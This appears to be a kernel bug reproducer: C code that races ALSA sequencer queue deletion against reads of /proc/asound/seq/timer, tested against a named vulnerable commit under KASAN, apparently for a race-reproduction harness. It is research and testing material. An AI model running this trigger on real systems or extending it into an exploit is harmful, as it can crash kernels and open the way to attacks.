/*
[COMMIT]
fix: 20f2e4c228c7
the fix is unreachable from main branch, so this PoC is tested against commit f3d83317a6

[COMPILE]
compiled with GCC 6.5, defconfig, with KASAN
*/

#define _GNU_SOURCE
#include <sound/asequencer.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <x86intrin.h>

unsigned long racee_delay=0, racer_delay=0;

static int fd, fd_proc;
struct snd_seq_queue_info info;
static char buf[100];

void sys_racee(void)
{
  read(fd_proc, buf, sizeof(buf));
}

void sys_racer(void)
{
  ioctl(fd, SNDRV_SEQ_IOCTL_DELETE_QUEUE, &info);
}

void do_setup(void)
{
  return;
}

void setup_one(void){
  fd = open("/dev/snd/seq", O_RDWR);
  if (fd == -1) {
    perror("[-] open /dev/snd/seq failed");
    exit(-1);
  }

  fd_proc = open("/proc/asound/seq/timer", O_RDWR);
  if (fd_proc == -1) {
    perror("[-] open /proc/asound/seq/timer failed");
    exit(-1);
  }

  info.queue = 1;
  ioctl(fd, SNDRV_SEQ_IOCTL_CREATE_QUEUE, &info);
}

void cleanup_one(){
  ioctl(fd, SNDRV_SEQ_IOCTL_DELETE_QUEUE, &info);
  close(fd_proc);
  close(fd);
}

void do_cleanup(void)
{
  return;
}

int sanity_check(void)
{
  fd = open("/dev/snd/seq", O_RDWR);
  if (fd == -1) {
    perror("[-] open /dev/snd/seq failed");
    return -1;
  }

  fd_proc = open("/proc/asound/seq/timer", O_RDWR);
  if (fd_proc == -1) {
    perror("[-] open /proc/asound/seq/timer failed");
    return -1;
  }

  info.queue = 1;
  if (ioctl(fd, SNDRV_SEQ_IOCTL_CREATE_QUEUE, &info) < 0) {
    perror("[-] ioctl SNDRV_SEQ_IOCTL_CREATE_QUEUE failed");
    return -1;
  }

  if (read(fd_proc, buf, sizeof(buf)) < 0) {
    perror("[-] read procfs failed");
    return -1;
  }

  if (ioctl(fd, SNDRV_SEQ_IOCTL_DELETE_QUEUE, &info) < 0) {
    perror("[-] ioctl SNDRV_SEQ_IOCTL_DELETE_QUEUE failed");
    return -1;
  }

  close(fd_proc);
  close(fd);

  return 0;
}